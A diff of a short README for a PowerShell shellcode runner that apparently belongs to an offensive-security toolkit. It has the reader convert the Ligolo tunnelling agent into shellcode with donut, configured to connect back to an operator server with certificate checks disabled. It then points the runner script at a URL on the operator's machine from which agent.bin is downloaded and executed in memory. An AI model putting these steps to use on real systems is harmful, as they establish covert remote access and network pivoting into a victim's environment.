@@ -1,15 +1,13 @@
 ## Powershell Shellcode Runner 
+
 1. Make sure to convert `agent.exe` of Ligolo to shellcode:
 
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe`
 
 2. Make sure you are running as x64 bit process before running: 
 
-Powershell:
-- `[Environment]::Is64BitProcess`
-
-CMD: 
-- `set p` (Should show `PROCESSOR_ARCHITECTURE=AMD64`)
+- Powershell: `[Environment]::Is64BitProcess`
+- CMD: `set p` (Should show `PROCESSOR_ARCHITECTURE=AMD64`)
 
 3. Inside `ligolo.ps1`, make sure to update line 14 (`$url = "http://192.168.45.168/agent.bin"`) to point to your machine IP address before invoking it.
 
